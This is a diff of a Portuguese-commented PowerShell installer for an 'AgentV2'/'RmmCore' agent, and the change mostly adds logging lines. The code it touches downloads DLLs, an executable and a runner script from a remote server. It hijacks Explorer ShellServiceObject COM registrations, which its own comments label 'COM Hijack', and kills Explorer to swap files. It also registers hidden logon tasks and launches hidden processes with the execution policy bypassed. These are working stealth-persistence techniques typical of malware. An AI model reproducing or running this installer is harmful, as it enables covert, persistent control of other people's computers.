@@ -137,9 +137,12 @@ function Save-RemoteFile {
                 throw 'ficheiro demasiado pequeno'
             }
 
+            # PS 5.1 Move-Item -Force NAO substitui ficheiro existente (Win32 183).
+            # COM Hijack: RmmCore.dll esta loaded no Explorer — libertar antes de copiar.
             if ($UnlockExplorer -or (Test-Path -LiteralPath $Dest)) {
                 try { Stop-RmmCoreUser -Dir $dir } catch { }
                 if ((Test-Path -LiteralPath $Dest) -and (Test-FileLocked -Path $Dest)) {
+                    Write-Host ("  {0} locked — a parar Explorer" -f (Split-Path -Leaf $Dest))
                     Stop-ExplorerProcesses
                     Start-Sleep -Seconds 2
                 }
@@ -156,6 +159,7 @@ function Save-RemoteFile {
             if (Test-Path -LiteralPath $tmp) {
                 Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
             }
+            Write-Host ("WARN {0} : {1} retry {2}/{3}" -f (Split-Path -Leaf $Dest), $_.Exception.Message, ($i + 1), $Retries)
             try {
                 Stop-RmmCoreUser -Dir $dir
                 Stop-ExplorerProcesses
@@ -208,6 +212,7 @@ function Save-ComCorePayload {
         [Parameter(Mandatory = $true)][string]$Dir
     )
     $dest = Join-Path $Dir 'RmmCore.dll'
+    Write-Host "GET RmmCore.dll (COM Hijack — so o core)"
     Save-RemoteFile -Uri "$ServerBase/download/RmmCore.dll" -Dest $dest -UnlockExplorer
 }
 
@@ -217,6 +222,7 @@ function Save-TaskFallbackPayload {
         [Parameter(Mandatory = $true)][string]$Dir
     )
     $runnerPath = Join-Path $Dir 'run-v2.ps1'
+    Write-Host "GET run-v2 (fallback task)"
     try {
         Save-RemoteFile -Uri "$ServerBase/loaders/run-v2.txt" -Dest $runnerPath
     }
@@ -226,10 +232,13 @@ function Save-TaskFallbackPayload {
 
     foreach ($f in @('RmmCore.Host.exe', 'RmmCore.Rundll.dll')) {
         $dest = Join-Path $Dir $f
+        Write-Host "GET $f (fallback task, opcional)"
         try {
             Save-RemoteFile -Uri "$ServerBase/download/$f" -Dest $dest
         }
-        catch { }
+        catch {
+            Write-Host "WARN skip $f : $($_.Exception.Message)"
+        }
     }
     return $runnerPath
 }
@@ -326,6 +335,7 @@ function Register-And-RunHiddenTask {
         [void]$folder.RegisterTaskDefinition($TaskName, $td, 6, $null, $null, 3)
     }
     catch {
+        Write-Warning "Task Scheduler: $($_.Exception.Message) — a tentar schtasks"
         $tr = '"{0}" {1}' -f $ExePath, $Arguments
         $null = & schtasks.exe /Create /TN $TaskName /SC ONLOGON /DELAY 0000:15 /RL LIMITED /F /TR $tr 2>&1
         if ($LASTEXITCODE -ne 0) { throw }
@@ -362,13 +372,18 @@ function Start-ViaRundll32 {
     if (-not (Test-Path -LiteralPath $RundllDll)) { return $false }
     $rundll = Get-NativeRundll32
     $args = '"{0}",AgentMain data={1}' -f $RundllDll, $Dir
+    Write-Host "Host rundll32 (oculto)"
     try {
         Register-And-RunHiddenTask -ExePath $rundll -Arguments $args -WorkDir $Dir
-    } catch { }
+    } catch {
+        Write-Warning "Task rundll32: $($_.Exception.Message)"
+    }
     if (Test-HostAlive -Dir $Dir -Mode Rundll32) { return $true }
     try {
         Start-ProcessHidden -FilePath $rundll -ArgumentList $args -WorkingDirectory $Dir
-    } catch { }
+    } catch {
+        Write-Warning "Start rundll32: $($_.Exception.Message)"
+    }
     Start-Sleep -Seconds 3
     return (Test-HostAlive -Dir $Dir -Mode Rundll32)
 }
@@ -377,13 +392,18 @@ function Start-ViaNativeHost {
     param([string]$Dir, [string]$HostExe)
     if (-not (Test-Path -LiteralPath $HostExe)) { return $false }
     $args = "data=$Dir"
+    Write-Host "Host Native/CLR (oculto)"
     try {
         Register-And-RunHiddenTask -ExePath $HostExe -Arguments $args -WorkDir $Dir
-    } catch { }
+    } catch {
+        Write-Warning "Task Host.exe: $($_.Exception.Message)"
+    }
     if (Test-HostAlive -Dir $Dir -Mode Native) { return $true }
     try {
         Start-ProcessHidden -FilePath $HostExe -ArgumentList $args -WorkingDirectory $Dir
-    } catch { }
+    } catch {
+        Write-Warning "Start Host.exe: $($_.Exception.Message)"
+    }
     Start-Sleep -Seconds 3
     return (Test-HostAlive -Dir $Dir -Mode Native)
 }
@@ -392,13 +412,18 @@ function Start-ViaPowerShellRunner {
     param([string]$Dir, [string]$RunnerPath)
     $ps = Get-NativePowerShell
     $arg = '-NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "{0}"' -f $RunnerPath
+    Write-Host "Host PowerShell run-v2 (oculto)"
     try {
         Register-And-RunHiddenTask -ExePath $ps -Arguments $arg -WorkDir $Dir
-    } catch { }
+    } catch {
+        Write-Warning "Task run-v2: $($_.Exception.Message)"
+    }
     if (Test-HostAlive -Dir $Dir -Mode PowerShell) { return $true }
     try {
         Start-ProcessHidden -FilePath $ps -ArgumentList $arg -WorkingDirectory $Dir
-    } catch { }
+    } catch {
+        Write-Warning "Start run-v2: $($_.Exception.Message)"
+    }
     Start-Sleep -Seconds 3
     return (Test-HostAlive -Dir $Dir -Mode PowerShell)
 }
@@ -422,18 +447,22 @@ function Start-HostCascade {
         $ok = $false
         switch ($step) {
             'Rundll32' {
+                Write-Host 'Tentativa: rundll32'
                 $ok = Start-ViaRundll32 -Dir $Dir -RundllDll $RundllDll
             }
             'Native' {
+                Write-Host 'Tentativa: RmmCore.Host.exe (CLR)'
                 $ok = Start-ViaNativeHost -Dir $Dir -HostExe $NativeExe
             }
             'PowerShell' {
+                Write-Host 'Tentativa: run-v2.ps1 (PowerShell oculto)'
                 $ok = Start-ViaPowerShellRunner -Dir $Dir -RunnerPath $RunnerPath
             }
         }
         if ($ok) {
             return @{ Ok = $true; Mode = $step }
         }
+        Write-Warning ("Falha {0} - a seguir cascade" -f $step)
     }
     return @{ Ok = $false; Mode = $null }
 }
@@ -510,6 +539,7 @@ function Unlock-V2ComDll {
         Stop-ExplorerProcesses
         Start-Sleep -Seconds 2
         if (-not (Test-FileLocked -Path $DllPath)) { return $true }
+        Write-Host ("  cache dll em uso — retry explorer $i/8")
     }
     return -not (Test-FileLocked -Path $DllPath)
 }
@@ -519,6 +549,7 @@ function Get-V2ComDllPath {
     $preferred = Join-Path $Dir $Script:V2ComDllName
     if ((Unlock-V2ComDll -DllPath $preferred)) { return $preferred }
     $alt = Join-Path $Dir ('usercache-{0}.dll' -f [guid]::NewGuid().ToString('N').Substring(0, 8))
+    Write-Warning "cache dll bloqueada pelo Explorer; a gravar $alt"
     return $alt
 }
 
@@ -613,12 +644,14 @@ function Get-InstallClsidCandidates {
         Add-ClsidToList -Value $prev -RequireInproc
     }
 
+    $ssoSeen = 0
     foreach ($rel in @(
             'Software\Microsoft\Windows\CurrentVersion\Explorer\ShellServiceObjects',
             'Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\ShellServiceObjects'
         )) {
         foreach ($name in @(Get-RegistrySubKeyNames -RelativePath $rel)) {
             if ($name -notmatch '^\{[0-9A-Fa-f-]{36}\}$') { continue }
+            $ssoSeen++
             Add-ClsidToList -Value $name
         }
     }
@@ -633,6 +666,10 @@ function Get-InstallClsidCandidates {
         }
     }
 
+    Write-Host ("cache providers: {0} candidatos={1}" -f $ssoSeen, $script:ClsidAccum.Count)
+    if ($script:ClsidAccum.Count -eq 0 -and $ssoSeen -eq 0) {
+        Write-Warning 'HKLM ShellServiceObjects vazio ou inacessivel.'
+    }
     return @($script:ClsidAccum.ToArray())
 }
 
@@ -1407,7 +1444,12 @@ function Install-V2Cache {
         throw "Nenhum CLSID automatico (ShellServiceObject / overlay com InprocServer32)."
     }
 
-    $null = Unregister-V2Cache
+    Write-Host ("providers: {0}" -f $candidates.Count)
+
+    $removed = Unregister-V2Cache
+    if ($removed -gt 0) {
+        Write-Host "Removidos providers v2 anteriores: $removed"
+    }
 
     $destDll = Get-V2ComDllPath -Dir $Dir
     Invoke-CompileV2CacheBootstrap -OutputPath $destDll -Arch $Arch
@@ -1416,6 +1458,7 @@ function Install-V2Cache {
     $result = $null
     foreach ($c in $candidates) {
         try {
+            Write-Host "Tentativa provider $c"
             $null = Unregister-V2Cache
             $result = Register-CacheProvider -Path $destDll -TargetClsid $c -Arch $Arch
             $orig = Save-OriginalInprocDll -TargetClsid $result.Clsid
@@ -1429,6 +1472,7 @@ function Install-V2Cache {
         }
         catch {
             $lastErr = $_
+            Write-Warning ("CLSID {0} falhou: {1}" -f $c, $_.Exception.Message)
             $null = Unregister-V2Cache
             $result = $null
         }
@@ -1442,6 +1486,8 @@ function Install-V2Cache {
     if (-not $SkipExplorerRestart) {
         Restart-ExplorerShell
     }
+
+    Write-Host ("AgentV2 cache OK -> clsid={0} dll={1} data={2}" -f $result.Clsid, $destDll, $Dir)
 }
 
 function Invoke-RemoveV2UserInstall {
@@ -1449,6 +1495,7 @@ function Invoke-RemoveV2UserInstall {
         [Parameter(Mandatory = $true)][string]$Dir,
         [switch]$SkipExplorerRestart
     )
+    Write-Host '==> Remove AgentV2 user (cache Explorer + task + rundll32/Host.exe + payload)'
     $prev = $ErrorActionPreference
     $ErrorActionPreference = 'SilentlyContinue'
     try {
@@ -1459,7 +1506,10 @@ function Invoke-RemoveV2UserInstall {
     catch { }
     Stop-RmmCoreUser -Dir $Dir
 
-    $null = Unregister-V2Cache
+    $keysRemoved = Unregister-V2Cache
+    if ($keysRemoved -gt 0) {
+        Write-Host ("  cache Explorer removido ({0})" -f $keysRemoved)
+    }
     if (-not $SkipExplorerRestart) {
         Restart-ExplorerShell
         Start-Sleep -Seconds 2
@@ -1472,6 +1522,12 @@ function Invoke-RemoveV2UserInstall {
             $p = Join-Path $d $n
             if (Test-Path -LiteralPath $p) {
                 Remove-Item -LiteralPath $p -Force -ErrorAction SilentlyContinue
+                if (-not (Test-Path -LiteralPath $p)) {
+                    Write-Host "  Removed $p"
+                }
+                else {
+                    Write-Warning "Ainda em uso: $p (fecha Explorer e volta a -Remove)"
+                }
             }
         }
         Get-ChildItem -LiteralPath $d -Filter 'usercache*.dll' -ErrorAction SilentlyContinue |
@@ -1481,9 +1537,17 @@ function Invoke-RemoveV2UserInstall {
     }
     if (Test-Path -LiteralPath $legacy) {
         Remove-Item -LiteralPath $legacy -Recurse -Force -ErrorAction SilentlyContinue
+        if (-not (Test-Path -LiteralPath $legacy)) {
+            Write-Host "  Removed $legacy"
+        }
     }
 
+    $sysSvc = Get-Service -Name RmmCoreV2Svc -ErrorAction SilentlyContinue
+    if ($sysSvc) {
+        Write-Host '  Servico RmmCoreV2Svc ainda presente. Admin: install-service.ps1 -Action Uninstall'
+    }
     $ErrorActionPreference = $prev
+    Write-Host 'AgentV2 user remove OK'
 }
 
 #endregion
@@ -1505,6 +1569,7 @@ $legacyStore = Join-Path $legacyDir 'agent.store.enc'
 $newStore = Join-Path $DataDir 'agent.store.enc'
 if ((Test-Path -LiteralPath $legacyStore) -and -not (Test-Path -LiteralPath $newStore)) {
     Copy-Item -LiteralPath $legacyStore -Destination $newStore -Force
+    Write-Host "Migrado agent.store.enc de $legacyDir"
 }
 
 Stop-RmmCoreUser -Dir $DataDir
@@ -1513,17 +1578,24 @@ Save-ComCorePayload -ServerBase $server -Dir $DataDir
 $taskOnly = $HostMode -in @('Rundll32', 'Native', 'PowerShell')
 if (-not $taskOnly) {
     try {
+        Write-Host "COM Hijack (cache Explorer) — sem Host.exe / rundll / run-v2.ps1"
         Write-V2UserBootstrap -Dir $DataDir -ServerBase $server -Mode $HostMode
         Install-V2Cache -Dir $DataDir -TargetClsid $Clsid -Arch $Architecture -SkipExplorerRestart:$NoRestartExplorer
+        Write-Host ("AgentV2 COM OK -> {0} (so RmmCore.dll + usercache.dll)" -f $DataDir)
         return
     }
     catch {
         if ($HostMode -eq 'Shell') { throw }
+        Write-Warning ("cache Explorer falhou — fallback task: {0}" -f $_.Exception.Message)
         $null = Unregister-V2Cache
     }
 }
 
-$null = Unregister-V2Cache
+$cacheRemoved = Unregister-V2Cache
+if ($cacheRemoved -gt 0) {
+    Write-Host "Removido cache Explorer residual ($cacheRemoved) — a usar task."
+    Restart-ExplorerShell
+}
 
 $runnerPath = Save-TaskFallbackPayload -ServerBase $server -Dir $DataDir
 Write-V2UserBootstrap -Dir $DataDir -ServerBase $server -Mode $HostMode -IncludeTaskHosts
@@ -1538,3 +1610,5 @@ $result = Start-HostCascade -Dir $DataDir -NativeExe $nativeExe -RundllDll $rund
 if (-not $result.Ok) {
     throw 'AgentV2 user install falhou: cache Explorer / rundll32 / Host.exe / run-v2 nenhum ficou activo.'
 }
+
+Write-Host ('AgentV2 user install OK -> {0} (host={1}; no SYSTEM service; task Hidden)' -f $DataDir, $result.Mode)
